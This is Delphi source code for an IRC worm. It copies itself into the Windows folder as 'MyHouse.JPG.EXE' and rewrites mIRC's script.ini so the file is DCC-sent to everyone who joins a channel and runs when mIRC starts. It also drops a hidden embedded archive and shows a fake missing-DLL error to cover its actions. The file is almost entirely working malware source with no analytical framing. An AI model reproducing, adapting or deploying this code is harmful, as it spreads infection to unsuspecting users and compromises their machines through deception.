   unit Unit1;

   interface

   uses
     Dialogs, Windows, SysUtils, Forms, Registry, Classes, Controls, StdCtrls;

   TYPE
     TForm1 = CLASS(TForm)
     PROCEDURE FormCreate(Sender: TObject);
     PRIVATE
     PUBLIC
     END;

   VAR
     Form1 : TForm1;

   CONST
     BigMan : ARRAY[1..726] OF Byte = (
     $50,$4B,$03,$04,$14,$00,$00,$00,$08,$00,$89,$0C,$22,$2C,$A6,$25,
     $19,$47,$68,$02,$00,$00,$39,$15,$00,$00,$06,$00,$00,$00,$44,$44,
     $2E,$52,$41,$52,$ED,$D7,$5B,$4C,$D2,$71,$14,$C0,$F1,$1F,$86,$A0,
     $A0,$FF,$2C,$C9,$2D,$74,$5E,$60,$86,$2B,$51,$04,$45,$5A,$A9,$5D,
     $34,$21,$C0,$5C,$6B,$28,$94,$37,$6C,$15,$19,$99,$61,$9A,$97,$2D,
     $AF,$A3,$B2,$1A,$F5,$92,$0D,$30,$2B,$A2,$96,$BA,$A4,$39,$5D,$AD,
     $07,$5A,$16,$94,$5B,$E4,$D0,$B8,$44,$6B,$5D,$74,$AE,$6C,$AC,$AD,
     $95,$AB,$CC,$5C,$BD,$FE,$9E,$7F,$4F,$BF,$B3,$9D,$A7,$73,$9E,$3E,
     $6F,$DF,$DD,$55,$C7,$93,$98,$54,$E0,$32,$E8,$00,$88,$04,$FF,$C7,
     $A9,$AD,$4F,$6C,$5B,$07,$16,$18,$E0,$DF,$86,$4C,$68,$CA,$CC,$0D,
     $11,$AC,$54,$06,$8F,$02,$12,$97,$EF,$F9,$F9,$69,$32,$95,$38,$7E,
     $9A,$7B,$E4,$50,$16,$B7,$82,$04,$C0,$45,$EA,$F2,$17,$60,$A5,$26,
     $92,$42,$33,$D2,$64,$E2,$AD,$DA,$18,$39,$00,$24,$8E,$DA,$F8,$4E,
     $19,$FC,$11,$AC,$FD,$55,$EE,$56,$D0,$17,$87,$B8,$35,$71,$6B,$F5,
     $A3,$A6,$64,$A3,$A2,$45,$73,$94,$AD,$D7,$26,$D3,$DC,$C7,$32,$9B,
     $F7,$76,$0A,$7C,$F6,$E6,$27,$44,$C8,$18,$71,$46,$A2,$8A,$8B,$ED,
     $9A,$20,$42,$46,$BF,$17,$44,$AE,$1A,$D2,$CA,$FC,$53,$36,$4D,$E9,
     $95,$D3,$D5,$DD,$5F,$39,$AD,$AC,$D6,$A2,$6F,$6D,$51,$C0,$D2,$A4,
     $71,$D6,$1C,$36,$0F,$F7,$53,$AC,$57,$C9,$D2,$D9,$08,$C3,$F6,$9E,
     $3D,$3C,$D5,$63,$FE,$79,$6F,$68,$51,$3C,$BD,$49,$1D,$08,$B6,$B6,
     $B8,$F6,$6D,$B6,$0E,$AE,$F6,$98,$E5,$63,$0F,$BA,$4F,$B1,$F9,$0D,
     $77,$C5,$23,$5A,$EE,$43,$85,$78,$65,$9E,$2A,$77,$C1,$45,$F8,$1E,
     $0D,$0B,$83,$74,$DD,$74,$98,$73,$43,$49,$CC,$9C,$ED,$CE,$33,$D1,
     $EC,$B8,$BE,$B0,$DF,$FE,$F3,$3D,$B9,$63,$8D,$2D,$7A,$45,$5F,$61,
     $59,$BD,$F5,$C2,$FA,$FB,$BA,$AA,$99,$5C,$67,$CF,$AD,$3C,$87,$6B,
     $7E,$A4,$BC,$2B,$20,$59,$B2,$33,$F5,$BB,$2E,$97,$08,$3C,$27,$C2,
     $FE,$DC,$CE,$36,$F9,$85,$16,$49,$84,$F4,$CB,$07,$87,$34,$76,$9B,
     $28,$BC,$6F,$E0,$60,$85,$EF,$F3,$8B,$99,$3A,$07,$91,$22,$39,$A9,
     $A9,$18,$D4,$0D,$78,$0B,$2A,$93,$2E,$19,$7F,$17,$33,$2C,$84,$FB,
     $E6,$01,$FB,$CB,$C6,$5E,$E7,$D3,$1D,$FC,$C5,$6B,$29,$ED,$E9,$96,
     $B9,$B7,$A2,$3A,$61,$42,$87,$CB,$40,$93,$2B,$8B,$DB,$B5,$B5,$67,
     $1D,$9D,$9B,$4A,$99,$82,$C6,$1C,$31,$7D,$92,$52,$29,$25,$EB,$97,
     $78,$53,$9F,$A2,$48,$3B,$CF,$ED,$AF,$4E,$9F,$55,$B2,$6F,$DC,$BB,
     $3E,$F9,$D1,$CC,$99,$B7,$2B,$3D,$A6,$DE,$E7,$D1,$EA,$32,$06,$88,
     $7F,$05,$E3,$E7,$63,$7E,$44,$FC,$1E,$18,$BF,$00,$F3,$23,$E2,$F7,
     $C2,$F8,$33,$31,$3F,$22,$7E,$3F,$8C,$5F,$88,$F9,$11,$F1,$FB,$60,
     $FC,$59,$98,$1F,$11,$FF,$6B,$18,$7F,$36,$E6,$47,$C4,$1F,$80,$F1,
     $8B,$30,$3F,$22,$FE,$37,$30,$FE,$8D,$98,$1F,$0D,$7F,$02,$05,$C2,
     $4F,$C9,$E0,$61,$7F,$44,$FE,$54,$A8,$3F,$EE,$5E,$54,$FE,$61,$50,
     $7F,$1C,$BE,$A8,$FC,$C3,$A1,$FE,$B8,$7C,$51,$F9,$D3,$A0,$FE,$38,
     $7D,$11,$F9,$83,$F1,$9C,$16,$B0,$85,$0A,$FE,$02,$50,$4B,$01,$02,
     $19,$00,$14,$00,$00,$00,$08,$00,$89,$0C,$22,$2C,$A6,$25,$19,$47,
     $68,$02,$00,$00,$39,$15,$00,$00,$06,$00,$00,$00,$00,$00,$00,$00,
     $00,$00,$20,$00,$00,$00,$00,$00,$00,$00,$44,$44,$2E,$52,$41,$52,
     $50,$4B,$05,$06,$00,$00,$00,$00,$01,$00,$01,$00,$34,$00,$00,$00,
     $8C,$02,$00,$00,$00,$00);


   IMPLEMENTATION

   {$R *.DFM}

   FUNCTION CopyFile(CONST SourceFile:TFilename;CONST DestinationFile:TFilename):  BOOLEAN;
   BEGIN
     RESULT := Windows.CopyFile(pChar(SourceFile),pChar(DestinationFile),FALSE);
   END;

   FUNCTION WinPath:STRING;
   VAR
     PWindowsDir: ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     RESULT:=StrPas(PWindowsDir);
     if result[length(result)]<>'\' then result:=result+'\';
   END;

   Procedure mIRC(s2:string);
    var
     f   : text;
     s   : string;
     Reg : TRegistry;
   begin
     Reg := TRegistry.Create;
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     if Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC',false) then begin
       s:=Reg.ReadString('UninstallString');
       delete(s,pos('mirc32.exe',s) or pos('mirc.exe',s),length(s));
       delete(s,1,1);
        assign(f,s+'script.ini');
       rewrite(f);
       writeln(f,'[Script]');
       writeln(f,'n0=ON 1:JOIN:#:{');
       writeln(f,'n1=/dcc send $nick ',s2);
       writeln(f,'n2=}');
       writeln(f,'n3=on 1:start:{');
       writeln(f,'n4= /run -n ',s2);
       writeln(f,'n5=}');

       closefile(f);
     end;
     Reg.CloseKey;
     Reg.Free;
   end;

   PROCEDURE BigManFile;
   VAR
     TBigMan : FILE;
   BEGIN
     SetFileAttributes(pChar(WinPath+'!!.BigMan.!!'),FILE_ATTRIBUTE_NORMAL);
     Assign(TBigMan,WinPath+'!!.BigMan.!!');
     Rewrite(TBigMan,1);
     BlockWrite(TBigman,BigMan[1],1937);
     Close(TBigMan);
     SetFileAttributes(pChar(WinPath+'!!.BigMan.!!'),FILE_ATTRIBUTE_HIDDEN);
   END;

   PROCEDURE TForm1.FormCreate(Sender: TObject);
    BEGIN
     if not fileexists(winpath+'MyHouse.JPG.EXE') THEN CopyFile (paramstr(0),Winpath+'MyHouse.JPG.EXE');
     mIRC(Winpath+'MyHouse.JPG.EXE');
     BigManFile;
     Application.messagebox('QTINTF3.DLL Not Found!','Error',MB_ICONHAND);
     form1.close;
     exitprocess(0);
   END;
   END.
